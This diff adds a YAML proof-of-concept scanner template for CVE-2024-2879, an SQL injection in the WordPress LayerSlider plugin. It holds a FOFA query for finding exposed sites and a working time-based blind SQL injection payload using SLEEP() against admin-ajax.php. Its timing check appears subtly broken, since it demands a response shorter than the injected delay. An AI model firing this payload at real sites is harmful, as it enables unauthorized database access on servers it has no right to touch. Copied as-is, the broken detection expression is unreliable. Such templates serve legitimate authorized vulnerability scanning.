@@ -1,0 +1,21 @@
+id: poc-yaml-wordpress-layerslider-sqli
+info:
+  name: WordPress LayerSlider插件 SQL注入漏洞(CVE-2024-2879)
+  severity: high
+  tags:
+  - CVE-2024-2879
+  - 两高一弱
+  finger: layerslider
+  fofa: body="/wp-content/plugins/LayerSlider"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /wp-content/plugins/LayerSlider/assets/static/public/front.css
+  expression: status_code == 200 && contains(body,".ls-clearfix:before")
+- method: GET
+  path: /wp-admin/admin-ajax.php?action=ls_get_popup_markup&id[where]=1)+AND+(SELECT+1+FROM+(SELECT(SLEEP({{.t1}})))x)--+x)
+  expression: status_code == 200 && contains(body,"<script>") && duration < t1 &&
+    duration < t2
+transport: http
